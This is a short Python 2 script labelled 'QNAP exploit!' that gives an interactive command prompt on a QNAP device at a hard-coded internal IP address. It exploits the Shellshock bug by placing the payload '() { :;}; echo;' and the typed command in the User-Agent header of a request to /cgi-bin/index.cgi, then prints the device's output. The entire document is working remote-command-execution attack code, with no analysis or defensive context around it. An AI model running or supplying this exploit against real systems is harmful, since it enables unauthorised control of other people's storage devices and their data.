#!/usr/bin/python
import socket
print "QNAP exploit!"
inputstr=""
while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	inputstr=raw_input("cmd> ")
	s.connect(("10.16.60.101",8080))
	s.send("GET /cgi-bin/index.cgi HTTP/1.0\nHost: 10.16.60.101\nUser-Agent: () { :;}; echo; "+inputstr+"\r\n\r\n")
	output=""
	while 1:
		buf=s.recv(4096)
		if not buf:
			break		
		output+=buf
	indexHTML= output.find("html")
	print output[0:indexHTML]
	s.close()	
